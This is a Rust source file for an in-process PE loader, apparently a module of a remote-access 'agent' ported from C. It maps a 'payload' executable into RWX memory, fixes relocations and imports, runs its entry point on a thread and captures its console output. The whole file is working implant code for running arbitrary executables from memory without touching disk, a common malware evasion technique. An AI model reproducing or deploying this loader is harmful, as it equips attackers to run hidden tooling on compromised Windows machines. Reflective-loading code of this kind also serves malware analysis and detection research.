/// Inline PE loader — in-process PE32+ execution for x64 EXEs.
/// Mirrors pe_exec.c from the C agent: all 8 phases including pipe-based
/// stdout capture and a 30-second wait before detaching.
use windows_sys::Win32::Foundation::CloseHandle;
use windows_sys::Win32::System::Memory::{
    VirtualAlloc, VirtualProtect,
    MEM_COMMIT, MEM_RESERVE,
    PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_READ, PAGE_READWRITE, PAGE_READONLY,
};
use windows_sys::Win32::System::Threading::{CreateThread, WaitForSingleObject};
use windows_sys::Win32::System::LibraryLoader::{LoadLibraryA, GetProcAddress};

// Raw declarations for the pipe / console functions — avoids pulling in extra
// windows-sys feature flags while keeping the linker happy.
extern "system" {
    fn CreatePipe(
        hReadPipe:        *mut isize,
        hWritePipe:       *mut isize,
        lpPipeAttributes: *const core::ffi::c_void,
        nSize:            u32,
    ) -> i32;
    fn SetHandleInformation(hObject: isize, dwMask: u32, dwFlags: u32) -> i32;
    fn GetStdHandle(nStdHandle: u32) -> isize;
    fn SetStdHandle(nStdHandle: u32, hHandle: isize) -> i32;
    fn ReadFile(
        hFile:                  isize,
        lpBuffer:               *mut u8,
        nNumberOfBytesToRead:   u32,
        lpNumberOfBytesRead:    *mut u32,
        lpOverlapped:           *mut core::ffi::c_void,
    ) -> i32;
}

const STD_OUTPUT_HANDLE:  u32 = 0xFFFFFFF5u32;
const STD_ERROR_HANDLE:   u32 = 0xFFFFFFF4u32;
const HANDLE_FLAG_INHERIT: u32 = 1;
const WAIT_TIMEOUT_VAL:   u32 = 258;
const PE_EXEC_TIMEOUT_MS: u32 = 30_000;
const IMAGE_REL_BASED_DIR64: u32 = 10;

// SECURITY_ATTRIBUTES (matches Win32 layout exactly)
#[repr(C)]
struct SecurityAttributes {
    length:               u32,
    security_descriptor:  *mut core::ffi::c_void,
    inherit_handle:       i32,  // BOOL
}

// ── Section characteristics → VirtualProtect flags ────────────────────────────

fn section_prot(chars: u32) -> u32 {
    const SCN_EXEC:  u32 = 0x2000_0000;
    const SCN_WRITE: u32 = 0x8000_0000;
    let exec  = chars & SCN_EXEC  != 0;
    let write = chars & SCN_WRITE != 0;
    if exec && write { return PAGE_EXECUTE_READWRITE; }
    if exec          { return PAGE_EXECUTE_READ; }
    if write         { return PAGE_READWRITE; }
    PAGE_READONLY
}

// ── Little-endian byte readers ────────────────────────────────────────────────

#[inline]
fn r16(d: &[u8], o: usize) -> u16 {
    u16::from_le_bytes(d[o..o + 2].try_into().unwrap())
}
#[inline]
fn r32(d: &[u8], o: usize) -> u32 {
    u32::from_le_bytes(d[o..o + 4].try_into().unwrap())
}
#[inline]
fn r64(d: &[u8], o: usize) -> u64 {
    u64::from_le_bytes(d[o..o + 8].try_into().unwrap())
}

// ── Main PE loader ────────────────────────────────────────────────────────────

pub fn exec_pe(pe_bytes: &[u8]) -> String {

    // ── Phase 1: Validate and parse headers ──────────────────────────────────

    if pe_bytes.len() < 0x40 {
        return "[error: payload too small to be a PE]".into();
    }
    if pe_bytes[0] != b'M' || pe_bytes[1] != b'Z' {
        return "[error: missing MZ signature]".into();
    }

    let pe_off = r32(pe_bytes, 0x3C) as usize;
    if pe_off + 24 > pe_bytes.len() {
        return "[error: e_lfanew out of bounds]".into();
    }
    if r32(pe_bytes, pe_off) != 0x0000_4550 {  // "PE\0\0"
        return "[error: missing PE signature]".into();
    }

    // FileHeader at pe_off + 4
    let fh_off = pe_off + 4;
    if r16(pe_bytes, fh_off) != 0x8664 {
        return "[error: not AMD64; only PE32+ (0x8664) supported]".into();
    }
    let num_sections = r16(pe_bytes, fh_off + 2)  as usize;
    let opt_hdr_sz   = r16(pe_bytes, fh_off + 16) as usize;

    // OptionalHeader at pe_off + 24; magic must be 0x020B (PE32+)
    let opt_off = pe_off + 24;
    if opt_off + 2 > pe_bytes.len() || r16(pe_bytes, opt_off) != 0x020B {
        return "[error: not a PE32+ (64-bit) image]".into();
    }

    let entry_rva     = r32(pe_bytes, opt_off + 16);     // AddressOfEntryPoint
    let pref_base     = r64(pe_bytes, opt_off + 24);     // ImageBase
    let size_of_image = r32(pe_bytes, opt_off + 56);     // SizeOfImage
    let size_of_hdrs  = r32(pe_bytes, opt_off + 60);     // SizeOfHeaders

    // DataDirectory for PE32+ starts at opt_off + 112 (16 reserved bytes +
    // 96 non-directory bytes in the standard optional header).
    // Entry [1] Import  → ddBase + 8
    // Entry [5] BaseRel → ddBase + 40
    let dd_base = opt_off + 112;
    let (imp_va, imp_sz) = if dd_base + 16 <= pe_bytes.len() {
        (r32(pe_bytes, dd_base + 8), r32(pe_bytes, dd_base + 12))
    } else {
        (0, 0)
    };
    let (reloc_va, reloc_sz) = if dd_base + 48 <= pe_bytes.len() {
        (r32(pe_bytes, dd_base + 40), r32(pe_bytes, dd_base + 44))
    } else {
        (0, 0)
    };

    // Section table follows the optional header
    let sec_base = opt_off + opt_hdr_sz;
    if num_sections > 0 {
        let sec_end = sec_base + num_sections * 40;
        if sec_end > pe_bytes.len() {
            return "[error: section table out of bounds]".into();
        }
    }

    unsafe {

    // ── Phase 2: VirtualAlloc — try preferred base, fall back to any addr ────

    let alloc_flags = MEM_COMMIT | MEM_RESERVE;
    let mut base = VirtualAlloc(
        pref_base as *const _,
        size_of_image as usize,
        alloc_flags,
        PAGE_EXECUTE_READWRITE,
    ) as *mut u8;
    if base.is_null() {
        base = VirtualAlloc(
            std::ptr::null(),
            size_of_image as usize,
            alloc_flags,
            PAGE_EXECUTE_READWRITE,
        ) as *mut u8;
    }
    if base.is_null() {
        return "[error: VirtualAlloc failed]".into();
    }
    let base_addr = base as usize;

    // ── Phase 3a: Copy PE headers ─────────────────────────────────────────────

    let hdr_copy = (size_of_hdrs as usize).min(pe_bytes.len());
    std::ptr::copy_nonoverlapping(pe_bytes.as_ptr(), base, hdr_copy);

    // ── Phase 3b: Copy sections ───────────────────────────────────────────────
    // IMAGE_SECTION_HEADER (40 bytes each):
    //   +8   VirtualSize      (u32)
    //   +12  VirtualAddress   (u32)
    //   +16  SizeOfRawData    (u32)
    //   +20  PointerToRawData (u32)
    //   +36  Characteristics  (u32)

    for i in 0..num_sections {
        let sh = sec_base + i * 40;
        let raw_sz  = r32(pe_bytes, sh + 16) as usize;
        let virt_va = r32(pe_bytes, sh + 12) as usize;
        let raw_off = r32(pe_bytes, sh + 20) as usize;
        if raw_sz == 0 || raw_off == 0 { continue; }
        if raw_off + raw_sz > pe_bytes.len() { continue; }
        if virt_va + raw_sz > size_of_image as usize { continue; }
        std::ptr::copy_nonoverlapping(
            pe_bytes.as_ptr().add(raw_off),
            base.add(virt_va),
            raw_sz,
        );
    }

    // ── Phase 4: Base relocations (IMAGE_REL_BASED_DIR64 = 10) ───────────────

    let delta = base_addr as i64 - pref_base as i64;
    if delta != 0 && reloc_va != 0 && reloc_sz != 0 {
        let mut p   = base_addr + reloc_va as usize;
        let r_end   = p + reloc_sz as usize;
        while p + 8 <= r_end {
            let block_va = *(p as *const u32) as usize;
            let block_sz = *((p + 4) as *const u32) as usize;
            if block_sz < 8 || p + block_sz > r_end { break; }
            let count = (block_sz - 8) / 2;
            for j in 0..count {
                let entry = *((p + 8 + j * 2) as *const u16);
                let typ   = (entry >> 12) as u32;
                let off   = (entry & 0x0FFF) as usize;
                if typ == IMAGE_REL_BASED_DIR64 {
                    let patch = (base_addr + block_va + off) as *mut i64;
                    patch.write_unaligned(patch.read_unaligned() + delta);
                }
            }
            p += block_sz;
        }
    }

    // ── Phase 5: Resolve IAT ──────────────────────────────────────────────────
    // IMAGE_IMPORT_DESCRIPTOR (20 bytes, null-terminated by Name==0):
    //   +0   OriginalFirstThunk  (u32, RVA of INT; 0 → fall back to FirstThunk)
    //   +12  Name                (u32, RVA of DLL name string)
    //   +16  FirstThunk          (u32, RVA of IAT)
    //
    // IMAGE_THUNK_DATA64 entries (8 bytes each):
    //   bit 63 set  → ordinal  (bits 0-15 = ordinal number)
    //   bit 63 clear → RVA to IMAGE_IMPORT_BY_NAME { u16 Hint; char Name[]; }

    if imp_va != 0 && imp_sz != 0 {
        let mut desc = base_addr + imp_va as usize;
        loop {
            let orig_ft  = *((desc     ) as *const u32) as usize;
            let name_rva = *((desc + 12) as *const u32) as usize;
            let first_ft = *((desc + 16) as *const u32) as usize;
            if name_rva == 0 { break; }

            let h_dll = LoadLibraryA((base_addr + name_rva) as *const u8);
            if h_dll != 0 {
                let int_base = base_addr + if orig_ft != 0 { orig_ft } else { first_ft };
                let iat_base = base_addr + first_ft;
                let mut j = 0usize;
                loop {
                    let thunk = *((int_base + j) as *const u64);
                    if thunk == 0 { break; }
                    let fn_addr: u64 = if thunk >> 63 == 1 {
                        // Ordinal import
                        GetProcAddress(h_dll, (thunk & 0xFFFF) as *const u8)
                            .map(|f| std::mem::transmute::<_, usize>(f) as u64)
                            .unwrap_or(0)
                    } else {
                        // Named import: RVA to IMAGE_IMPORT_BY_NAME; skip 2-byte Hint
                        GetProcAddress(h_dll, (base_addr + thunk as usize + 2) as *const u8)
                            .map(|f| std::mem::transmute::<_, usize>(f) as u64)
                            .unwrap_or(0)
                    };
                    *((iat_base + j) as *mut u64) = fn_addr;
                    j += 8;
                }
            }
            desc += 20;
        }
    }

    // ── Phase 6: Per-section memory protections ───────────────────────────────

    for i in 0..num_sections {
        let sh = sec_base + i * 40;
        let raw_sz  = r32(pe_bytes, sh + 16) as usize;
        let virt_va = r32(pe_bytes, sh + 12) as usize;
        let chars   = r32(pe_bytes, sh + 36);
        if raw_sz == 0 { continue; }
        let mut old = 0u32;
        VirtualProtect(
            base.add(virt_va) as *const _,
            raw_sz,
            section_prot(chars),
            &mut old,
        );
    }

    // ── Phase 7: Redirect stdout/stderr; create thread at entry point ─────────

    let mut pipe_read:  isize = 0;
    let mut pipe_write: isize = 0;
    let sa = SecurityAttributes {
        length:              std::mem::size_of::<SecurityAttributes>() as u32,
        security_descriptor: std::ptr::null_mut(),
        inherit_handle:      1,  // TRUE — write end is inheritable
    };
    let pipe_ok = CreatePipe(
        &mut pipe_read, &mut pipe_write,
        &sa as *const SecurityAttributes as *const core::ffi::c_void,
        0,
    ) != 0;
    if pipe_ok {
        // Read end must NOT be inherited by the PE's CRT
        SetHandleInformation(pipe_read, HANDLE_FLAG_INHERIT, 0);
    }

    let old_stdout = GetStdHandle(STD_OUTPUT_HANDLE);
    let old_stderr = GetStdHandle(STD_ERROR_HANDLE);
    if pipe_ok {
        SetStdHandle(STD_OUTPUT_HANDLE, pipe_write);
        SetStdHandle(STD_ERROR_HANDLE,  pipe_write);
    }

    type EntryFn = unsafe extern "system" fn(*mut core::ffi::c_void) -> u32;
    let ep_fn: Option<EntryFn> =
        Some(std::mem::transmute(base_addr + entry_rva as usize));
    let mut tid = 0u32;
    let h_thread = CreateThread(std::ptr::null(), 0, ep_fn, std::ptr::null(), 0, &mut tid);

    if h_thread == 0 {
        if pipe_ok {
            SetStdHandle(STD_OUTPUT_HANDLE, old_stdout);
            SetStdHandle(STD_ERROR_HANDLE,  old_stderr);
            CloseHandle(pipe_write);
            CloseHandle(pipe_read);
        }
        return "[error: CreateThread failed]".into();
    }

    let wait_res = WaitForSingleObject(h_thread, PE_EXEC_TIMEOUT_MS);
    CloseHandle(h_thread);

    // Restore handles; close the write end to signal EOF to the reader.
    if pipe_ok {
        SetStdHandle(STD_OUTPUT_HANDLE, old_stdout);
        SetStdHandle(STD_ERROR_HANDLE,  old_stderr);
        CloseHandle(pipe_write);
    }

    if wait_res == WAIT_TIMEOUT_VAL {
        if pipe_ok { CloseHandle(pipe_read); }
        return "[+] PE executing (async \u{2014} entry point did not return within 30 s)".into();
    }

    // ── Phase 8: Collect captured output ─────────────────────────────────────

    if !pipe_ok {
        return "[+] PE executed (output not captured)".into();
    }

    let mut output: Vec<u8> = Vec::with_capacity(4096);
    let mut tmp = [0u8; 4096];
    let mut rd: u32 = 0;
    while ReadFile(
        pipe_read,
        tmp.as_mut_ptr(),
        tmp.len() as u32,
        &mut rd,
        std::ptr::null_mut(),
    ) != 0 && rd > 0 {
        output.extend_from_slice(&tmp[..rd as usize]);
    }
    CloseHandle(pipe_read);

    if output.is_empty() {
        "[+] PE executed (no output)".into()
    } else {
        String::from_utf8_lossy(&output).into_owned()
    }

    } // end unsafe
}
